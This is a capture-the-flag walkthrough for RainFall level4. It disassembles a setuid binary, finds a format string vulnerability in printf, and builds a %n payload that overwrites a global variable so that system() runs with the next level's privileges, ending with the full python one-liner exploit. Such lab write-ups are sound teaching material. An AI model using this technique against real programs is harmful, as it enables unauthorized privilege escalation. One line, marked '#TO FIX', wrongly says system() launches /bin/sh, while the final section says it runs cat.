## Walkthrough

We list the files in the current home directory.

```nasm
level4@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile

level4@RainFall:~$ file ./level4
./level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped

```

The file is owned by **level5** and has the **setuid** bit.

We list the functions inside the executable and analyze their assembly code with **GDB**.

```nasm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  p
0x08048457  n
0x080484a7  main
0x080484c0  __libc_csu_init
0x08048530  __libc_csu_fini
0x08048532  __i686.get_pc_thunk.bx
0x08048540  __do_global_ctors_aux
0x0804856c  _fini
```

There are 3 interesting functions: `main()`, `p()` and `n()`.

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   %ebp
   0x080484a8 <+1>:	mov    %esp,%ebp
   0x080484aa <+3>:	and    $0xfffffff0,%esp
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    
End of assembler dump.
```

The `main()` function only calls the `n()` function.

```nasm
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.

```

The function:

- Calls `fgets()` to read input into a buffer located at `ebp - 0x208`
- Calls the function `p()`
- Retrieves the value of a global variable stored at memory address `0x8049810` into the `%eax` register
- Compares the value of `%eax` with`16930116` (`0x1025544`in hexadecimal)

```bash
**level4@RainFall:~$** gdb ./level4 
(gdb) b *0x08048455
Breakpoint 1 at 0x8048455
(gdb) r < /tmp/level4
(gdb) p *0x8049810
$1 = 16930116
```

- If the value is equal to `16930116` :
    - Calls the system’s shell `/bin/sh`  using the `system()` function. #TO FIX

The `p()` function:

```nasm
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.
```

This function:

- Calls `printf()` to print the buffer to stdout

### Format string vulnerability

Similar to the previous level, this function is vulnerable to a format string attack which occurs when a user input is improperly used as a format string in functions like `printf()`. This allows attackers to manipulate memory, access sensitive data, or execute arbitrary code.

Our goal is to overwrite the value of the global variable stored at the address `0x8049810`and replace it with the number `16930116`.

### Converting the address

The global variable (whose value is stored in the `%eax` register and compared to `16930116`) is located at the address `0x8049810`. To properly inject this address into the format string, we need to represent it in **little-endian** format, as this is how memory addresses are stored on the target system. The little-endian format for the address `0x8049810` is:  `\x10\x98\x04\x08` . 

**Little-endian** is a way of representing multi-byte data in memory where the **least significant byte** (the "lowest" byte) is stored at the **lowest memory address**, and the **most significant byte** is stored at the highest memory address.

### Overwriting the address

This level is similar to the previous one, except this time our offset (the number of characters between the start of our buffer and our target input) is larger. The number being compared is different, and there is a call to the function `p()`, meaning we have additional stack elements pushed (like `ebp`).

The `printf()` function includes the specifier `%n` which writes the number of characters printed so far into the address provided as its corresponding argument. This allows us to overwrite a specific memory address with the number of characters printed by the format string.

To achieve our goal, we need to craft a string such that the total number of characters printed is `16930116`. The `%n` specifier will then overwrite the global variable at `0x8049810` with the number `16930116` (the number of characters printed). Each `%x` will print a 4-byte value, each  `.`  is a 1-byte character and the `%16930040x` will print 16930040-bytes characters (filling with 0 or spaces). This gives us : 

```bash
'.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%16930040x.%n'
```

### Final command

Since `cat` is already called within the `system()` call, we do not need to explicitly invoke it ourselves for this level. The final command is : 

```bash
level4@RainFall:~$ python -c "print('\x10\x98\x04\x08' + '.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%16930040x.%n')" | ./level4
```
